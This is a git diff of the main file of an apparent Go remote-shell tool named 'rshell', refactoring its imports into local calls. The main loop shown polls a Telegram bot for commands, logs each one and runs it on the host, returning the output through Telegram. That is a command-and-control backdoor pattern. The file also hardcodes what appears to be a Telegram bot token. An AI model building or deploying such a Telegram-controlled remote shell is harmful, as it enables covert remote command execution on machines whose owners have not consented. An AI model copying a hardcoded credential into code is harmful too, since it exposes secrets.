@@ -2,8 +2,6 @@ package main
 
 import (
 	"log"
-	"rshell/execute"
-	"rshell/messenger"
 	"time"
 )
 
@@ -12,7 +10,8 @@ const TELEGRAM_TOKEN string = "5526760482:AAGweoNtLrHEsLC6whjms78y" // change th
 
 func main() {
 
-	telegram := *messenger.NewTelegramMessenger(CHAT_ID, TELEGRAM_TOKEN)
+	// create telegram engine
+	telegram := *NewTelegramMessenger(CHAT_ID, TELEGRAM_TOKEN)
 
 	for ; ; time.Sleep(time.Second) {
 
@@ -25,6 +24,6 @@ func main() {
 		log.Println("Recive command", command)
 
 		// Execute command in background and send response to telegram
-		execute.RunCommand(&telegram, command)
+		RunCommand(&telegram, command)
 	}
 }
